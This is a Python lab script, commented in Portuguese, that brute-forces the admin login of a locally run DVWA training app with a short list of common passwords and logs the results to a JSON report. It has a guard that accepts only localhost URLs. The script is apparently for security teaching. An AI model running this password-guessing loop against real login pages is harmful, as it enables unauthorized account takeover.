"""Demonstração de força bruta, restrita a um DVWA executado localmente."""
import json
import os
import time
from pathlib import Path
from urllib.parse import urlparse

import requests

URL = os.getenv("DVWA_BRUTE_URL", "http://localhost:8080/vulnerabilities/brute/")
SESSION_ID = os.getenv("DVWA_PHPSESSID", "")
PASSWORDS = ["123456", "admin", "password", "root", "password123"]


def only_local(url: str) -> None:
    if urlparse(url).hostname not in {"localhost", "127.0.0.1", "::1"}:
        raise ValueError("Este script aceita somente URLs locais do laboratório.")


def save_result(data: dict) -> None:
    report = Path(__file__).parents[1] / "resultados" / "relatorio_testes.json"
    entries = json.loads(report.read_text(encoding="utf-8")) if report.exists() else []
    entries.append(data)
    report.write_text(json.dumps(entries, ensure_ascii=False, indent=2), encoding="utf-8")


def main() -> None:
    only_local(URL)
    if not SESSION_ID:
        raise SystemExit("Defina DVWA_PHPSESSID após autenticar-se no DVWA.")

    started = time.perf_counter()
    success = False
    attempts = 0
    found_password = None
    cookies = {"PHPSESSID": SESSION_ID, "security": "low"}
    for password in PASSWORDS:
        attempts += 1
        response = requests.get(
            URL,
            params={"username": "admin", "password": password, "Login": "Login"},
            cookies=cookies,
            timeout=10,
        )
        if "Welcome to the password protected area" in response.text:
            success, found_password = True, password
            break

    elapsed = round(time.perf_counter() - started, 3)
    result = {"teste": "forca_bruta", "sucesso": success, "tentativas": attempts,
              "tempo_segundos": elapsed, "senha_encontrada": found_password}
    save_result(result)
    print(json.dumps(result, ensure_ascii=False))


if __name__ == "__main__":
    main()
